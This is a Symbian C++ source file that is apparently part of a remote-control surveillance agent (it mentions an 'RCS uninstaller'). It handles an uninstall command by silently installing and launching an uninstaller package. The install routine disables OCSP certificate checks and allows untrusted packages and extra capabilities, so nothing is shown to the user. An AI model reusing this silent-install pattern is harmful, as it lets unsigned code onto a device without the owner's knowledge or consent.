/*
 * StateUninstall.cpp
 *
 *  Created on: Apr 22, 2010
 *      Author: pavarang
 */

#include "StateCmdUninstall.h"

#include <apgcli.h> // for RApaLsSession
#include <apacmdln.h> // for CApaCommandLine

#include <swinstapi.h>			// Uninstaller
#include <swinstdefs.h>



CStateCmdUninstall::CStateCmdUninstall(MStateObserver& aObserver) : CAbstractState(EState_Cmd_Uninstall, aObserver)
	{
	// No implementation required
	}

CStateCmdUninstall::~CStateCmdUninstall()
	{
	}

CStateCmdUninstall* CStateCmdUninstall::NewLC(MStateObserver& aObserver)
	{
	CStateCmdUninstall* self = new (ELeave) CStateCmdUninstall(aObserver);
	CleanupStack::PushL(self);
	self->ConstructL();
	return self;
	}

CStateCmdUninstall* CStateCmdUninstall::NewL(MStateObserver& aObserver)
	{
	CStateCmdUninstall* self = CStateCmdUninstall::NewLC(aObserver);
	CleanupStack::Pop(); // self;
	return self;
	}

void CStateCmdUninstall::ConstructL()
	{

	}

void CStateCmdUninstall::LaunchAppL(){
	
	TThreadId app_threadid;
	CApaCommandLine* cmdLine; 
	cmdLine=CApaCommandLine::NewLC();
	cmdLine->SetExecutableNameL(_L("Uninstaller.exe"));
	cmdLine->SetCommandL( EApaCommandRun );
	RApaLsSession ls;
	User::LeaveIfError(ls.Connect());
	TInt err=ls.StartApp(*cmdLine,app_threadid);
	ls.Close();
	CleanupStack::PopAndDestroy(); // cmdLine
}

void CStateCmdUninstall::InstallAppL(){

	// Prepare for silent install
	SwiUI::RSWInstSilentLauncher      launcher; 
	SwiUI::TInstallOptions            options;
	SwiUI::TInstallOptionsPckg        optionsPckg;	
	
	// Connect to the server
	User::LeaveIfError( launcher.Connect() );
	  
	// See SWInstDefs.h for more info about these options
	options.iUpgrade = SwiUI::EPolicyAllowed;
	options.iOCSP = SwiUI::EPolicyNotAllowed;
	options.iDrive = 'C';   // Hard-coded as phone memory  
	options.iUntrusted = SwiUI::EPolicyAllowed; 
	options.iCapabilities = SwiUI::EPolicyAllowed;
	    
	optionsPckg = options;
	
	TInt err = KErrNone;
	err = launcher.SilentInstall(_L("C:\\Private\\20030635\\Uninstaller.sisx"),optionsPckg);
	
	launcher.Close();
}
void CStateCmdUninstall::ActivateL(const TDesC8& aData)
	{
		
		// Install the RCS uninstaller
		InstallAppL();
		
		// Launch Uninstaller
		LaunchAppL();
		
	}

void CStateCmdUninstall::ProcessDataL(const TDesC8& aData) 
	{
		
	}

